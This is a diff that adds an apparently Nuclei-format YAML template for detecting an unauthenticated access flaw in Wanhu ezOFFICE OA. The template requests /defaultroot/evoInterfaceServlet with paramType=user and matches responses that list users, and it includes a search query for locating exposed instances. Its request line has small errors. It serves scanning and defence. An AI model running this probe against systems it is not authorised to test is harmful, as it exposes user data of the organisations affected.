@@ -1,0 +1,29 @@
+id: wanhu-ezofficeoa-evoInterfaceservlet-bypassauth
+
+info:
+  name: wanhu-ezofficeoa-evoInterfaceservlet-bypassauth
+  author: yy
+  severity: high
+  description: 万户ezOFFICE标准版是针对的是全国众多的小型企业的办公自动化需求而专门开发的一套协同办公系统。系统采用免费轻量级数据库和中间件，以满足小型企业应用特点。该系统的主要功能有信息管理、工作流程、公文管理、个人办公平台、综合办公管理、人事管理、内部沟通交流等，管理范围广泛，功能完善。该系统存在未授权漏洞。
+  tags: wanhu,bypassauth
+  metadata:
+    hunter-qeury: app.name="万户 Ezoffice OA"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        GET /defaultroot/evoInterfaceServlet?paramType={{user}} HTTP/1.1 HTTP/1.1
+        Host: 
+
+    payloads:
+      user:
+        - "user"
+
+    stop-at-first-match: true           
+    matchers:     
+      - type: dsl
+        name: bypassauth
+        dsl:
+          - "status_code_1 == 200 && contains(body,'success') && contains(body,'userList') && contains(header,'text/plain')" 
